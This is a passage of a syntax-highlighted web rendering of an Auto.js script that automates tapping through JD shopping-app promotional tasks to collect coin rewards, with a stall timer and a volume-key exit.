data-num=\"9\"></td><td><pre><span class=\"token comment\">// 是否需要进入活动界面</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">var</span> isNeedIntoActivityUi <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 判断停留时间</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 定时器</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">var</span> interval<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 任务进行中标记</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">var</span> task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 是否为品牌墙任务</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">var</span> is_pp <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 是否领取奖励</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">var</span> is_get_reward <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"项目地址:https://github.com/czj2369/jd_tb_auto\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"音量上键结束脚本运行\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"如果程序无法自动进入活动页，请手动进入！\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">// 子线程监听音量上键按下</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    threads<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        events<span class=\"token punctuation\">.</span><span class=\"token function\">setKeyInterceptionEnabled</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"volume_up\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// 启用按键监听</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        events<span class=\"token punctuation\">.</span><span class=\"token function\">observeKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token comment\">// 监听音量上键按下</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        events<span class=\"token punctuation\">.</span><span class=\"token function\">onKeyDown</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"volume_up\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">event</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"脚本退出!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\">// 子线程开启计时</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    threads<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>interval <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token comment\">// 开启计时器，进行卡顿计时</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token comment\">// 启动定时器前，将计数器归为 0</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开启定时器\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            interval <span class=\"token operator\">=</span> <span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token comment\">//console.log (\"停留时间计时：\", JUDGE_TIME);</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token function\">recoverApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前手机分辨率\"</span><span class=\"token punctuation\">,</span> device<span class=\"token punctuation\">.</span>width<span class=\"token punctuation\">,</span> device<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">// 设置分辨率</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token function\">setScreenMetrics</span><span class=\"token punctuation\">(</span><span class=\"token number\">1090</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1920</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"设置手机脚本分辨率\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1090</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1920</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    auto<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    auto<span class=\"token punctuation\">.</span><span class=\"token function\">setMode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"normal\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token comment\">// 启动京东</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    app<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>appPackageName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\">// 启动任务</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        task_process <span class=\"token operator\">=</span> <span class=\"token function\">clikcFinish</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token function\">enterActivity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>task_process<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token function\">execTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"75\"></td><td><pre> * 进入活动界面</pre></td></tr><tr><td data-num=\"76\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">enterActivity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">desc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"浮层活动\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"购物车\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        <span class=\"token keyword\">const</span> rect <span class=\"token operator\">=</span> <span class=\"token function\">desc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"浮层活动\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">findOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token function\">click</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token function\">click</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">textContains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"距离下次抽到分红\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"做任务 赚金币\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"点击做任务\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">855</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1893</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1035</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1920</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">855</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1893</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1035</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1920</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"97\"></td><td><pre> * </pre></td></tr><tr><td data-num=\"98\"></td><td><pre> * @returns 点击去完成</pre></td></tr><tr><td data-num=\"99\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">clikcFinish</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">textContains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"去打卡\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">const</span> daka <span class=\"token operator\">=</span> <span class=\"token function\">textContains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"去打卡\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">findOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token function\">click</span><span class=\"token punctuation\">(</span>daka<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> daka<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前进度：10/10\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>is_get_reward<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">516</span><span class=\"token punctuation\">,</span> <span class=\"token number\">648</span><span class=\"token punctuation\">,</span> <span class=\"token number\">606</span><span class=\"token punctuation\">,</span> <span class=\"token number\">684</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">705</span><span class=\"token punctuation\">,</span> <span class=\"token number\">648</span><span class=\"token punctuation\">,</span> <span class=\"token number\">792</span><span class=\"token punctuation\">,</span> <span class=\"token number\">684</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">891</span><span class=\"token punctuation\">,</span> <span class=\"token number\">648</span><span class=\"token punctuation\">,</span> <span class=\"token number\">981</span><span class=\"token punctuation\">,</span> <span class=\"token number\">684</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        is_get_reward <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前任务序号：\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">TASK_ID</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token keyword\">const</span> button <span class=\"token operator\">=</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"去领取\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"去领取\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"去完成\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token constant\">TASK_ID</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>button <span class=\"token operator\">!=</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>        <span class=\"token keyword\">const</span> rect <span class=\"token operator\">=</span> button<span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>        <span class=\"token keyword\">const</span> parentButton <span class=\"token operator\">=</span> button<span class=\"token punctuation\">.</span><span class=\"token function\">parent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> parentButton<span class=\"token punctuation\">.</span><span class=\"token function\">childCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>            <span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> parentButton<span class=\"token punctuation\">.</span><span class=\"token function\">children</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> b<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> b<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>                <span class=\"token keyword\">const</span> info <span class=\"token operator\">=</span> parentButton<span class=\"token punctuation\">.</span><span class=\"token function\">children</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前任务:\"</span><span class=\"token punctuation\">,</span> info<span class=\"token punctuation\">.</span><span class=\"token function\">children</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span><span class=\"token function\">children</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"浏览5个品牌墙店铺\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>                    is_pp <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>        <span class=\"token comment\">//sleep(2000);</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">click</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"点击去完成\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 